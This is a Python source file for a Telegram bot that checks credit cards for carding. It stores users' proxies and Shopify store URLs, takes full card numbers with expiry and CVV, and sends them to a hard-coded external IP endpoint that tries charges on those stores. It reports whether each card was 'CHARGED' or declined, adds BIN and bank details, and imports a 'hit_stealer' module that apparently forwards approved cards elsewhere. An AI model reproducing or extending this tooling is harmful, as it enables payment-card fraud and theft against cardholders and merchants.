import httpx
import time
import asyncio
import urllib.parse
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# --- Helper: Proxy Checker ---
async def check_proxy_working(proxy_str):
    try:
        parts = proxy_str.split(':')
        if len(parts) == 4:
            host, port, user, pwd = parts
            proxy_url = f"http://{user}:{pwd}@{host}:{port}"
        elif len(parts) == 2:
            host, port = parts
            proxy_url = f"http://{host}:{port}"
        else:
            return False, "Invalid Format (Use host:port:user:pass)"

        async with httpx.AsyncClient(proxies=proxy_url, timeout=10) as client:
            response = await client.get("http://google.com")
            return (True, "Working ✅") if response.status_code == 200 else (False, "Failed Connection")
    except:
        return False, "Proxy Error"

# --- Management Commands ---

@Client.on_message(filters.command("setproxy", [".", "/"]))
async def set_proxy_cmd(client, message):
    user_id = message.from_user.id
    if len(message.command) < 2:
        return await message.reply("❌ **Usage:** `/setproxy host:port:user:pass`", quote=True)
    
    proxy = message.text.split(None, 1)[1]
    wait_msg = await message.reply("⏳ **Testing Proxy...**", quote=True)
    is_working, status = await check_proxy_working(proxy)
    
    if is_working:
        await set_user_proxy(user_id, proxy)
        await wait_msg.edit(f"✅ **Proxy Saved!**\n`{proxy}`")
    else:
        await wait_msg.edit(f"❌ **Proxy Not Working!**\n`{status}`")

# --- Command: Remove Proxy ---
@Client.on_message(filters.command("removeproxy", [".", "/"]))
async def remove_proxy_cmd(client, message):
    user_id = message.from_user.id
    await remove_user_proxy(user_id)
    await message.reply("🗑️ **Proxy Removed Successfully!**", quote=True)

# --- Command: Remove Specific Site ---
@Client.on_message(filters.command("removesite", [".", "/"]))
async def remove_site_cmd(client, message):
    user_id = message.from_user.id
    if len(message.command) < 2:
        return await message.reply("❌ **Usage:** `/removesite https://example.com`", quote=True)
    
    site_url = message.text.split(None, 1)[1]
    await remove_user_site(user_id, site_url)
    await message.reply(f"🗑️ **Site Removed!**\n`{site_url}`", quote=True)

# --- Command: Clear All Sites ---
@Client.on_message(filters.command("clearsites", [".", "/"]))
async def clear_sites_cmd(client, message):
    user_id = message.from_user.id
    await clear_all_user_sites(user_id)
    await message.reply("🗑️ **All Saved Sites Cleared!**", quote=True)
    

@Client.on_message(filters.command("addsite", [".", "/"]))
async def add_site_cmd(client, message):
    if len(message.command) < 2:
        return await message.reply("❌ **Usage:** `/addsite https://example.com`", quote=True)
    site_url = message.text.split(None, 1)[1]
    await add_user_site(message.from_user.id, site_url)
    await message.reply(f"✅ **Site Added!**\n`{site_url}`", quote=True)

@Client.on_message(filters.command("sets", [".", "/"]))
async def my_config_cmd(client, message):
    user_id = message.from_user.id
    proxy = await get_user_proxy(user_id)
    sites = await get_user_sites(user_id)
    resp = f"⚙️ **YOUR CONFIG**\n\n🌐 **Proxy:** `{proxy if proxy else 'None'}`\n🛍️ **Sites:**\n"
    resp += "\n".join([f"• `{s}`" for s in sites]) if sites else "_No sites added._"
    await message.reply(resp, quote=True)

# --- Main /sfs Command ---

@Client.on_message(filters.command("sfs", [".", "/"]))
async def sfs_shopify_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        
        # 1. Check User Config
        user_proxy = await get_user_proxy(user_id)
        user_sites = await get_user_sites(user_id)
        
        if not user_proxy:
            return await message.reply("❌ **No Proxy Set!**\nUse `/setproxy host:port:user:pass` first.", quote=True)
        if not user_sites:
            return await message.reply("❌ **No Sites Added!**\nUse `/addsite https://site.com` first.", quote=True)

        # 2. Check CC Input
        checkall = await check_all_thing(Client, message)
        if checkall[0] == False: return
        
        getcc = await getmessage(message)
        if getcc == False:
            return await message.reply("❌ **Format:** `/sfs cc|mm|yy|cvv`", quote=True)

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        # 3. Prepare API Call (Using first saved site)
        target_site = user_sites[0] 
        encoded_site = urllib.parse.quote(target_site)
        encoded_proxy = urllib.parse.quote(user_proxy)
        endpoint_url = f"http://108.165.12.183:8081/?cc={fullcc}&url={encoded_site}&proxy={encoded_proxy}"

        # 4. Animation & Processing
        loading_msg = await message.reply("🍳", quote=True)
        start = time.perf_counter()
        
        async def call_api():
            async with httpx.AsyncClient(timeout=60) as session:
                try:
                    response_obj = await session.get(endpoint_url)
                    res = response_obj.json()
                    api_resp = res.get("Response", "No Response")
                    status = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 🔥" if "completed" in api_resp.lower() else "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
                    return status, f"{api_resp} | Price: {res.get('Price','N/A')} | Site: {res.get('Site','N/A')}"
                except: return "Error", "API Timeout/Error"

        task = asyncio.create_task(call_api())
        await asyncio.sleep(2) # Ensure animation plays
        status, response = await task

        # 5. Final Response (Fixed Indentation)
        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5]
        elapsed = round(time.perf_counter() - start, 2)

        finalresp = f"""[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>
[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}
[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}
━━━〔 INFO 〕━━━
[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}
[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}
[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}
━━━〔 META 〕━━━
[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ Self Shopify 🛍️
[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed}s
[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 ⟶ <a href='tg://user?id={user_id}'>{first_name}</a>
━━━〔 OWNER 〕━━━
<a href="tg://user?id=8340881349">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>"""

        try: await loading_msg.delete()
        except: pass
        await message.reply_text(finalresp, quote=True)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception as e:
        print(f"Error: {e}")
